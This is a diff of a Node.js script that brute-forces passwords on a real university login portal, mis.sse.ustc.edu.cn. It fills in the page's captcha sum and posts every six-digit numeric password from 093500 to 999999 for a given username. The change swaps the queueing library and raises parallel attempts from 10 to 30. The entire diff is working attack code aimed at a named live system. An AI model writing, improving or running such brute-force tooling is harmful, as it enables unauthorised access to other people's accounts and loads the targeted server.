@@ -16,7 +16,7 @@ const FormData = require("form-data");
 const node_fetch_1 = __importDefault(require("node-fetch"));
 const cheerio = require("cheerio");
 const utils_1 = __importDefault(require("./utils"));
-const p_queue_1 = __importDefault(require("p-queue"));
+const async_1 = __importDefault(require("async"));
 const log = console.log;
 const baseUrl = "http://mis.sse.ustc.edu.cn/";
 const pattern = /ValidateCode\.aspx(.*?)[0-9]\\/g;
@@ -25,6 +25,7 @@ function worker(username) {
         let success = false;
         let view_state = "";
         let password = "093500";
+        const concurrency = 30;
         username = username.toLowerCase();
         log("username: ", username);
         /**
@@ -57,10 +58,7 @@ function worker(username) {
                     });
                     log("sum:", sum);
                     log("session", cookieJar);
-                    const queue = new p_queue_1.default({ concurrency: 10 });
-                    const tryPass = () => {
-                        const mypass = password;
-                        password = increase(password);
+                    const trypass = async_1.default.queue(function (password, done) {
                         /**
                          * 组装数据
                          */
@@ -68,7 +66,7 @@ function worker(username) {
                         formData.append("__EVENTTARGET", "winLogin$sfLogin$ContentPanel1$btnLogin");
                         formData.append("__VIEWSTATE", view_state);
                         formData.append("winLogin$sfLogin$txtUserLoginID", username);
-                        formData.append('winLogin$sfLogin$txtPassword', mypass);
+                        formData.append('winLogin$sfLogin$txtPassword', password);
                         formData.append('winLogin$sfLogin$txtValidate', sum + "");
                         return node_fetch_1.default(baseUrl + "default.aspx", {
                             method: "post",
@@ -76,40 +74,35 @@ function worker(username) {
                                 cookie: Array.from(cookieJar.values()).join(";")
                             },
                             body: formData
-                        }).then(login => {
+                        })
+                            .then(login => {
                             /**
                              * iflysse是登陆成功时拿到的cookie值
                              */
                             const iflysse = utils_1.default.getCookie(login);
                             if (iflysse.length === 0) {
-                                log("failed ", "password: ", mypass);
+                                log("failed ", "password: ", password);
                             }
                             else {
-                                log("success ", "用户名: ", username, "密码: ", mypass);
+                                log("success ", "用户名: ", username, "密码: ", password);
                                 success = true;
-                                resolve("success " + "用户名: " + username + "密码: " + mypass);
+                                resolve("success " + "用户名: " + username + "密码: " + password);
                             }
-                            return;
+                            done();
                         })
-                            .catch(reject);
-                    };
-                    for (let i = 0; i < 110; i++) {
-                        queue.add(tryPass);
-                    }
-                    queue.on("active", () => {
-                        log("size", queue.size);
-                        if (queue.size < 100 && !success && parseInt(password) <= 999999) {
-                            queue.add(tryPass);
-                        }
-                        else {
+                            .catch(e => {
+                            log(e);
+                            done();
+                        });
+                    }, concurrency);
+                    while (parseInt(password) <= 999999 && !success) {
+                        trypass.push(password, () => {
                             if (success) {
-                                queue.pause();
+                                trypass.kill();
                             }
-                            if (parseInt(password) > 999999) {
-                                queue.pause();
-                            }
-                        }
-                    });
+                        });
+                        password = increase(password);
+                    }
                 }
                 catch (error) {
                     log(error);
